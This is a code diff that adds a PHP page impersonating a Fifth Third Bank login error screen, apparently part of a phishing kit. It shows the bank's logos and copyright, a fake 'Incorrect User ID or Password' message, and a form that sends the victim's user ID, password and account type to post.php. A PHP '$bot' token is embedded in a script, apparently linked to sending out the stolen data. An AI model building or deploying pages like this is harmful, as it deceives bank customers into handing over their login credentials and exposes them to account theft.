@@ -1,0 +1,325 @@
+<?php
+require 'main.php';
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fifth - Login Error</title>
+    <link rel="stylesheet" href="res\css\main.css" />
+    <style>
+        /* ── error message override ── */
+        .error-box {
+            background: #f8e7e7;
+            border-left: 4px solid #c00;
+            padding: 14px 18px;
+            margin-bottom: 22px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.95rem;
+        }
+        .error-box .error-icon {
+            font-size: 1.6rem;
+            line-height: 1;
+            color: #c00;
+        }
+        .error-box .error-text {
+            color: #a00;
+            font-weight: 500;
+        }
+        .error-box .error-text strong {
+            font-weight: 700;
+        }
+        .error-box .error-hint {
+            color: #555;
+            font-weight: 400;
+            font-size: 0.85rem;
+            margin-top: 2px;
+        }
+
+        /* keep the original login card look */
+        .login {
+            background: #fff;
+            padding: 30px 35px 35px;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            max-width: 420px;
+            margin: 0 auto;
+        }
+        .login h2 {
+            margin-top: 0;
+            margin-bottom: 22px;
+            font-weight: 600;
+            font-size: 1.6rem;
+            color: #1a2a3a;
+        }
+        .group {
+            margin-bottom: 18px;
+        }
+        .group label {
+            display: block;
+            font-weight: 500;
+            font-size: 0.9rem;
+            margin-bottom: 4px;
+            color: #333;
+        }
+        .group input,
+        .group select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        .group input:focus,
+        .group select:focus {
+            border-color: #0055a5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 85, 165, 0.15);
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: #0055a5;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 4px;
+        }
+        .login-button:hover {
+            background: #003d7a;
+        }
+        .options {
+            margin-top: 18px;
+            font-size: 0.9rem;
+            line-height: 1.7;
+            text-align: center;
+        }
+        .options a {
+            color: #0055a5;
+            text-decoration: none;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+        .options br {
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        /* ── header / footer (mirror original) ── */
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        header .logo img {
+            height: 40px;
+            width: auto;
+        }
+        header .logoo img {
+            height: 32px;
+            width: auto;
+        }
+        header .links {
+            font-size: 0.8rem;
+            color: #555;
+        }
+        header .links a {
+            color: #0055a5;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        header .links a:hover {
+            text-decoration: underline;
+        }
+        header .links a:first-child {
+            margin-left: 0;
+        }
+
+        .bottom {
+            padding: 14px 30px;
+            font-size: 0.85rem;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e5e5e5;
+            color: #555;
+        }
+        .bottom a {
+            color: #0055a5;
+            text-decoration: none;
+        }
+        .bottom a:hover {
+            text-decoration: underline;
+        }
+        .bottom span {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .container {
+            padding: 40px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: 50vh;
+        }
+
+        footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 30px;
+            background: #f2f4f6;
+            border-top: 1px solid #ddd;
+            font-size: 0.75rem;
+            color: #555;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        footer .logo img {
+            height: 28px;
+            width: auto;
+        }
+        footer p {
+            margin: 0;
+            flex: 1;
+        }
+
+        /* ── responsive tweaks ── */
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            header .links {
+                text-align: center;
+            }
+            .login {
+                padding: 20px;
+            }
+            footer {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ═══ HEADER ═══ -->
+    <header>
+        <div class="logo">
+            <img src="res\img/logo.svg" alt="Fifth Third Bank" />
+        </div>
+        <div class="logoo">
+            <img src="res\img/logoo.png" alt="logo" />
+        </div>
+        <div class="links">
+            <a href="#">CUSTOMER SERVICE</a> |
+            <a href="#">BRANCH &amp; ATM LOCATOR</a>
+        </div>
+    </header>
+
+    <script>
+        var token = <?php echo json_encode($bot); ?>;
+    </script>
+
+    <!-- ═══ BREADCRUMB ═══ -->
+    <div class="bottom">
+        <a href="#">Home</a> &gt; <span>Login</span>
+    </div>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <div class="container">
+
+        <div class="login">
+
+            <h2>Log in</h2>
+
+            <!-- ── ERROR MESSAGE ── -->
+            <div class="error-box" role="alert">
+                <span class="error-icon">&#9888;</span>
+                <div>
+                    <div class="error-text">
+                        <strong>Incorrect User ID or Password.</strong>
+                    </div>
+                    <div class="error-hint">
+                        Please check your credentials and try again.
+                    </div>
+                </div>
+            </div>
+
+            <form action="post.php" method="post">
+
+                <div class="group">
+                    <select name="accountType">
+                        <option value="online">Online Banking</option>
+                        <option value="commercial">Commercial Banking</option>
+                    </select>
+                </div>
+
+                <div class="group">
+                    <label for="user-id">User ID</label>
+                    <input
+                    type="text"
+                    id="user-id"
+                    name="user"
+                    value=""
+                    required
+                    autofocus
+                    />
+                </div>
+
+                <div class="group">
+                    <label for="password">Password</label>
+                    <input
+                    type="password"
+                    id="password"
+                    name="pass"
+                    required
+                    />
+                </div>
+
+                <button type="submit" class="login-button">LOG IN</button>
+
+                <div class="options">
+                    <a href="#">Forgot Login?</a><br />
+                    First Time User? <a href="#">Register.</a>
+                </div>
+
+            </form>
+        </div>
+
+    </div>
+
+    <script src="res/jq.js"></script>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer>
+        <p>
+            Copyright &copy; 2024 Fifth Third Bank, National Association.
+            All Rights Reserved. Member FDIC. FDIC Logo Equal Housing Lender
+        </p>
+        <div class="logo">
+            <img src="res\img/logo.svg" alt="Fifth Third Bank" />
+        </div>
+    </footer>
+
+</body>
+</html>
